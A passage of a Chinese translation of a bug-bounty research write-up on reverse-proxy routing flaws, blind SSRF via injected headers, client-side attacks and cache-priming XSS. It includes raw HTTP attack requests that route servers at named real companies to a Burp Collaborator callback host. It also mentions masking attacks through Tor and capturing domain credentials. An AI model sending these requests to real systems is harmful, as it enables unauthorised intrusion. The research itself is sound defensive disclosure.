    Host: newrelic.com
    Connection: close
上述代码在处理这个时会把该请求重写成`http://PI:EMAIL/`接着将其路由到`burp-collaborator.net`。和之前一样，这个漏洞让我有了访问大量内部员工信息（包括未授权的管理界面和一个神秘的笑话）的权限。
不幸的是，New Relic没有提供现金奖励，但他们信守承诺，在一个假日迅速的修复了漏洞，并向Apache
HttpComponents报告了存在问题的底层库，随后[这个问题被修复了](https://issues.apache.org/jira/browse/HTTPCLIENT-1803)，所以其他正在使用Apache
HttpComponents的朋友们不用担心了。这并不是第一次在受众面如此广的平台上出现准确的攻击载荷—— [2011年的Apache
mod_rewrite](https://www.contextis.com/resources/blog/server-technologies-reverse-proxy-bypass/)。很明显这并不是众所周知的常识，除了New
Relic受影响，我还发现这个问题同样存在于17台雅虎服务器上，所以我又赚了8000刀。
# 隧道
正如我们所看的，经常被忽视的功能（使用@构建一个误导性的URL）是非常有效的。但并不是所有的系统都支持这种url，所以我将之前的payload进行了改造：
    GET xyz.burpcollaborator.net:80/bar HTTP/1.1
    Host: demo.globaleaks.org
    Connection: close
这条payload后的原理是存在问题的主机可能会把请求路由到`xyz.burpcollaborator.net`公共后端系统，这条记录会被我们的泛解析DNS记录。实际上我收到的是一串神秘的大小写混合的DNS查找记录，并且是来自不同的IP地址：
    xYZ.BurpcoLLABoRaTOR.neT.    from 89.234.157.254
    Xyz.burPColLABorAToR.nET.    from 62.210.18.16 
    xYz.burpColLaBorATOR.net.    from 91.224.149.254
GlobalLeaks（公司名）使用了Tor2Web将收到的请求转发Tor隐藏的服务接口从而隐藏自己的物理位置。Tor使用了一种模糊安全机制来提高DNS的安全性，原理是通过随机化请求的大小写，这种机制导致了Burp
Collaborator服务器拒绝响应，所以触发了大量的dns查找。
这个独特的漏洞非常不好量化。因为所有的请求都是通过Tor，这就不能滥用于访问任何内网服务。这就说，这是一种非常强大的方式，如果用于掩盖对第三方的攻击，特别是因为GlobalLeaks是一个举报平台，它不可能保留任何日志所以最终可能会乖乖替你背锅。此外，通过Tor使web服务器连接到竞争对手的网站的这种能力会暴露出大量的攻击面。
# 目标辅助系统
我们已经看到反向代理的显著多样性和使服务器错误路由请求技术的必要性，但迄今为止最终的效果都差不多。在这节中，我们将看到，在以后端分析和缓存之类的辅助系统为目标时，找出真正有用的漏洞通常比首先引发回调函数更困难。
### 收集信息
不像以路由为基的攻击，这些攻击技术通常并不影响网站的正常功能。Collaborator Everywhere通过注入大量不同的攻击到每个请求中来利用这一点。
    GET / HTTP/1.1
    Host: store.starbucks.ca
    X-Forwarded-For: a.burpcollaborator.net
    True-Client-IP: b.burpcollaborator.net
    Referer: http://c.burpcollaborator.net/
    X-WAP-Profile: http://d.burpcollaborator.net/wap.xml
    Connection: close
##### X-Forwarded-For
易于触发但难以利用的回调技术的一个示例是X-Forwarded-For和True-Client-IP
HTTP头，渗透人员通常利用它们来欺骗IP地址或主机名。信任这些头的应用会进行DNS查找去解析主机名到对应的IP地址。这就给了我们一个很友好的提示，表明他们容易受到IP欺骗攻击，但除非你有便携的DNS库内存损坏漏洞，否则不太好利用回调来攻击。
##### Referer
与前面相似，web分析系统会从来访者的Referer头中获取所有的未识别URL。一些分析系统为了SEO目的甚至会去尝试爬取referer中url的整个站点。这个动作可能是有用的，所以值得放一个允许的robots.txt文件来鼓励这种行为。从另外一个角度来说这很有可能是一个blind
SSRF漏洞，因为用户无法查看分析系统请求的结果，且这发生的时间可能是在用户请求后几分钟或几小时，这会加大利用难度。
##### 重复的参数
因为Incapsula会在请求字符串中获取指定的url两次。但不幸的是他们没有漏洞悬赏机制，所以我不能调查这是不是可利用的。
##### X-Wap-Profile
X-Wap-Profile是一个古老的http头，该头指定了设备的用户代理配置文件URL，这个文件是一个定义了设备的功能（如屏幕大小，蓝牙支持，支持的协议和字符集等）的XML文档。
    GET / HTTP/1.1
    Host: facebook.com
    X-Wap-Profile: http://nds1.nds.nokia.com/uaprof/N6230r200.xml
    Connection: close
按套路出牌的程序会从请求头中提取url，然后解析到指定的XML文档，这样便于它们调整提供给客户的内容。将这两个高风险功能（获取不受信任的URL和解析不受信任的URL）与其他模糊和不容易发现的功能结合，似乎形成了可以利用的渠道。但不幸的是，这个请求头没有受到广泛支持。Facebook是我发现对此进行了漏洞悬赏的唯一一家公司，并且他们在对待XML解析上相当谨慎。他们在请求发出后的26个小时才获取指定的XML文档，这使得全面迭代测试非常不切实际。
# 远程客户端漏洞利用
上面这些例子中，如果直接进行SSRF风格的利用是非常困难的，因为我们无法从应用获得反馈。与此对应是利用能够运行的RCE（比如本月的Struts2）向内网进行喷洒似探测，这种方法有点像lcamtuf在[《Against
the System：rise of the
Robots》](http://phrack.org/issues/57/10.html)的web爬虫。在娱乐方面，这种技术没什么意思，所以我将焦点放在了与我们相关的客户端上。和反向代理一样，客户端的审计比较差，容易被现成的工具攻击。只需通过和服务器建立一个HTTPS连接，我就能够轻松的从服务器上窃取内存，并且可以在系统上执行古老的客户端心脏滴血攻击。像PhantomJS这种无界面浏览器通常是过时（跟不上最新的安全机制），缺少大量的重要安全补丁。基于Windows的客户端通常会主动将域名凭证发送到运行着SpiderLabs
[Responder](https://github.com/SpiderLabs/Responder)的服务器上，lcmatuf的[p0f](http://lcamtuf.coredump.cx/p0f3/)能够发现隐藏在假代理后的客户端真正运行的东西。
虽然应用程序会过滤URL的输入，但许多库对重定向都是透明处理的，所以可能会导致在重定向url上有不同的行为。例如，Tublr的URL预览功能只支持HTTP协议，但却乐于重定向到FTP服务。这些技术未来会有一些研究来完善，因为Orange
Tsai正专注于编程语言URL解析和请求库。
有些客户端所做的工作不仅是下载页面-实际还有渲染和执行javascript。这样的话会使攻击面很大，没办法手动去做映射，所以我的同事Gareth
Heyes创建了一个名为“Rendering Engine Hackability
Probe”的工具，用于完整的指纹识别客户端的功能。除了识别自定义浏览器中的常见故障（如忽略执行SOP），它还能标记了不寻常的JavaScript属性。
如图所示，我们可以知道这款工具能够检测未识别的Javascript属性`parity`和`System`，这两个属性是Parity浏览器注入进去的，目的是让网站初始化[Etherenum](https://en.wikipedia.org/wiki/Ethereum)。未识别的参数可以分为有点意思的到非常有用的。`parity`属性可以用来获取用户钱包的公钥（全局唯一的标志）和得知钱包余额。JXBrowser允许开发者插入JavaScript/Java桥接器，去年我们发现可以利用这一点来[转义渲染](http://blog.portswigger.net/2016/12/rce-in-jxbrowser-javascriptjava-bridge.html)然后进行任意代码执行。如果启用存在配置问题的JavaScript客户端，这可能会连接到file:///URL，这会导致本地文件读取（通过存储在环境变量中的恶意HTML代码）然后在`/proc/self/environ`中展示——这其实属于跨协议的盲打XSS漏洞。除了可视化显示结果外，每个功能也能触发服务端请求，所以即使你看不到渲染结果，这也很有用。这个工具的基本测试在较为苛刻的客户端上（即使不能执行JavaScript）也能正常工作。
# 优先缓存
在寻找路由利用漏洞的时候，我注意到了某个军事服务器有一些奇怪的行为。它发出了这样的请求：
    GET / HTTP/1.1
    Host: burpcollaborator.net
这个请求从服务器获得了正常的响应，接着几秒后collaborator收到了几个请求。
    GET /jquery.js HTTP/1.1
    GET /abrams.jpg HTTP/1.1
很明显，这是一次扫描响应，目的是资源引入和资源获取。当它识别出``时，它会使用我提供的host头去把相对url扩展成`http://burpcollaborator.net/abrams.jpg`并获取该文件，以便作缓存。通过从反向代理那获取缓存响应，我证实了刚才那一理论。这是一个相当有意思的攻击，我在后端应用程序中发现了XSS，接着通过刚才聊的技术在响应中对内部服务器上进行了一次假图片的引用。
    POST /xss.cgi HTTP/1.1
    Content-Length: 103
    Connection: close
    xss=
缓存反向代理服务器识别出了这个资源，然后进行资源引入和获取这个`image`，并将它存储在我能轻易获取的地方：
    GET /index.php/fake.jpg
    Host: internal-server.mil
    Connection: close
下面的流程图展示了攻击顺序：
请注意，在绝对url中使用XSS意味着即使应用程序拒绝了请求（包含不被识别的host头），这种攻击也会起作用。
# 结论
最近几年，漏洞悬赏的迅速增加促进了新的攻击类型研究。现在在15分钟内对成千上万点服务器对一个新的攻击概念进行评估了。通过这个技术，我已经向各位展示了即使再小的反响代理问题也可能引发重大致命的漏洞，在这整个过程中国年我获得了33000美元。为了实现深度防御，反向代理被划入防火墙保护范畴内，并接入DMZ，从公网中独立出来。
我还展示了如何揭开后端系统并详细讲解了他们的操作。相对于前端来说，后端不不容易发生致命的问题，但他们暴露了丰富的攻击面，这面尚在研究中。最后，我确保Burp
Suite的Scanner功能可以探测到路由漏洞，并发布了Collaborator
Everywhere和Hackability作为开源工具来推动进一步的研究。
享受这一切吧。-@albinowax。